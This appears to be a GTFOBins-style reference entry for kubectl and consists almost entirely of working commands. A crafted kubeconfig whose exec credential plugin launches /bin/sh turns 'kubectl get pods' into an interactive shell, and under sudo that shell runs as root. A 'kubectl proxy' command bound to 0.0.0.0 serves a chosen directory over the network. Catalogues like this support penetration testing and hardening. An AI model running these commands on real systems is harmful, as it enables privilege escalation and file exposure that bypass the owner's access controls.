title: kubectl
html:
kubectl

Shell

Context: sudo, unprivileged

cat >/path/to/temp-file <<EOF
clusters:
- cluster:
    server: https://x
  name: x
contexts:
- context:
    cluster: x
    user: x
  name: x
current-context: x
users:
- name: x
  user:
    exec:
      apiVersion: client.authentication.k8s.io/v1
      interactiveMode: Always
      command: /bin/sh
      args:
        - '-c'
        - '/bin/sh 0<&2 1>&2'
EOF

kubectl get pods --kubeconfig=/path/to/temp-file

Upload

Context: sudo, suid, unprivileged

kubectl proxy --address=0.0.0.0 --port=12345 --www=/path/to/dir/ --www-prefix=/x/
excerpt: kubectl Shell Context: sudo, unprivileged cat >/path/to/temp-file <<EOF clusters: - cluster: server: https://x name: x contexts: - context: cluster: x user: x name: x current-context: x users
